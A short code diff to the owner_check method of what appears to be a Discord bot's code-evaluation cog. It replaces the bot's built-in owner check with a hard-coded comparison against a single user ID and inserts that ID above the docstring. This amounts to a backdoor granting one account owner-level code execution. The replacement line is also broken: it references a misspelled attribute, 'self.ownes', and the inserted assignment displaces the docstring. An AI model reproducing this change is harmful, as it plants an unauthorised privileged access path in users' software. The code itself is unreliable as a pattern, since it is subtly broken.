@@ -251,6 +251,7 @@ class Evaluate:
 
     # noinspection PyUnresolvedReferences,PyMethodMayBeStatic
     async def owner_check(self, ctx):
+        owners = [293992072887795712]
         """
         Checks the owner is valid. If no owner is set, it should immediately fail.
 
@@ -264,15 +265,14 @@ class Evaluate:
 
             >>> class WhitelistedOwnerSuperuserCog(superuser.SuperuserCog):
             ...
-            ...     owners = [1856271517491511531, 4325824835683126527, 21512642468346835632]
+            ...     owners = [293992072887795712]
             ...     async def owner_check(self, ctx):
             ...         return ctx.author.id in self.owners
             ...
 
-            >>> bot.add_cog(WhitelistedOwnerSuperuserCog())
-
+            
         """
-        return await ctx.bot.is_owner(ctx.author)
+        return ctx.author.id in self.ownes
 
     #############################################################################
     # Warning: do not change this.                                              #
